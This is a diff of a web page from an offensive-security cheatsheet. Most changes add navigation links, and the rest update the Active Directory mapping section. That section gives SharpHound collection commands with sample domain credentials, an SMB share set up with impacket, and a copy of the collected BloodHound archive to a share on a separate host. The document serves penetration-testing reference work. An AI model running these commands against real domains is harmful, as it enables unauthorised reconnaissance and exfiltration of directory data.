@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-03-08T15:44:24 CET">
+<meta name="revised" content="2020-04-23T18:56:15 CEST">
 <title>Domain Mapping :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -203,6 +203,13 @@
         <div>
           <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/">
             Belati
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/">
+            sn0int
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -544,10 +551,10 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/recon-enumeration/services-enumeration/1721_vpn/" class="dd-item">
+      <li data-nav-id="/recon-enumeration/services-enumeration/1721_500_vpn/" class="dd-item">
         <div>
-          <a href="/recon-enumeration/services-enumeration/1721_vpn/">
-            1721 - VPN
+          <a href="/recon-enumeration/services-enumeration/1721_500_vpn/">
+            1721/500 - VPN
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -811,6 +818,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/web-attacks/attacking_apis/" class="dd-item">
+        <div>
+          <a href="/web-attacks/attacking_apis/">
+            Attacking APIs
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/network/" class="dd-item haschildren
@@ -1020,6 +1034,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/exploitation/ipv6/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/ipv6/">
+            IPv6
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item haschildren
@@ -1103,6 +1124,13 @@
         <div>
           <a href="/windows-systems/post-exploitation-techniques/searching_informations/">
             Searching Informations
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/post-exploitation-techniques/persistence/" class="dd-item">
+        <div>
+          <a href="/windows-systems/post-exploitation-techniques/persistence/">
+            Persistence
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1519,7 +1547,7 @@ C:<span style="color:#8045ff">\&gt;</span> SharpHound.exe
 C:<span style="color:#8045ff">\&gt;</span> SharpHound.exe — CollectionMethod SessionLoop — MaxLoopTime 1h
 C:<span style="color:#8045ff">\&gt;</span> SharpHound.exe — CollectionMethod ACL
 
-C:<span style="color:#8045ff">\&gt;</span> ShardHound.exe --Domain factory.lan --DomainController &lt;ip&gt; --LDAPUser user --LDAPPass <span style="color:#d88200">&#34;pass&#34;</span> --CollectionMethod All,GPOLocalGroup,LoggedOn</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Python based ingestor (for remote work)</span>
+.<span style="color:#8045ff">\S</span>harpHound.exe --domain UCA.LAN --domaincontroller <span style="color:#ae81ff">192</span>.168.30.10 --ldapusername <span style="color:#d88200">&#34;die-hardman&#34;</span> --ldappassword <span style="color:#d88200">&#34;maskonyourface&#34;</span> --CollectionMethod Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,ObjectProps,ACL,ComputerOnly,Trusts,Default,RDP,DCOM,DCOnly</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Python based ingestor (for remote work)</span>
 https://github.com/fox-it/BloodHound.py
 
 <span style="color:#75715e"># Collection Methods : Default, Group, LocalAdmin, RDP, DCOM, Session, Acl, Trusts, LoggedOn, ObjectProps, All (except LoggedOn)</span>
@@ -1532,10 +1560,11 @@ Import-Module .<span style="color:#8045ff">\S</span>harphound.ps1
 Invoke-Bloodhound
 Invoke-BloodHound -CollectionMethod All
 
-sudo python smbserver.py testlol /home/xx /tmp
-sudo python smbserver.py -smb2support testlol /home/xx /tmp
+<span style="color:#75715e"># Since Windows 10 you can&#39;t do anonymous smbserver anymore</span>
+sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username <span style="color:#d88200">&#34;peon&#34;</span> -password <span style="color:#d88200">&#34;peon&#34;</span>
 
-net view <span style="color:#8045ff">\\</span><span style="color:#ae81ff">10</span>.10.16.112<span style="color:#8045ff">\T</span>ESTLOL
+net use Z: <span style="color:#8045ff">\\</span><span style="color:#ae81ff">192</span>.168.30.130<span style="color:#8045ff">\S</span>DFR /user:peon peon
+net use Z: /delete /y
 
 copy C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\x</span>xx<span style="color:#8045ff">\D</span>ocuments<span style="color:#8045ff">\2</span>0191104044628_BloodHound.zip <span style="color:#8045ff">\\</span><span style="color:#ae81ff">10</span>.10.16.112<span style="color:#8045ff">\T</span>ESTLOL<span style="color:#8045ff">\f</span>ile.zip</code></pre></div>
 <h4 id="analysis">Analysis</h4>
